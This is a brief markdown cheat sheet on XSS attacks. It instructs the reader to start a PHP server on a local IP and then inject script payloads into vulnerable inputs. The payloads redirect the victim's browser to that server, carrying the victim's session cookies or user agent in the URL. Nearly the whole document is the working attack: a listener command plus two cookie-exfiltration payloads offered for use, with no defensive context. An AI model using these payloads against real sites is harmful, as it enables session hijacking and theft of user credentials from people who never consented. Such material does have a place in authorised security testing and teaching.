## XSS attacks

### run below command first
```
php -S <lcoal_ip>:8000
```

### place below code in vulnerable inputs
```
<script>window.location='<lcoal_ip>:8000/?cookie='+document.cookie</script>
<script>window.location='<lcoal_ip>:8000/?cookie='+navigator.userAgent</script>
```
